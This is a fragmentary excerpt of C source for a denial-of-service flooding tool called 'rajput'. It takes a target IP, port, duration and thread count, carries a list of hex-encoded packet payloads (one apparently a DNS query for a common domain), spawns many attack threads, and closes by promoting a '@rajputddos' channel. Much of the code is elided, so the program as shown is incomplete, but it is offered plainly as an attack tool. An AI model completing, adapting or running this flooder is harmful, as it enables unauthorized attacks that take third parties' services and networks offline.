...
void usage() {
    printf("Usage: ./rajput ip port time threads\n");
    exit(1);
}
...
void *attack(void *arg) {
    ...
    char *payloads[] = {
        ...
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",              "\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x00\x00",
...
int main(int argc, char *argv[]) {
    ...
    for (int i = 0; i < threads; i++) {
        ...
        printf("Launched thread with ID: Rajput %lu\n", thread_ids[i]);
    }
    ...
    free(thread_ids);
    printf("Attack finished join @rajputddos\n");
    return 0;
}
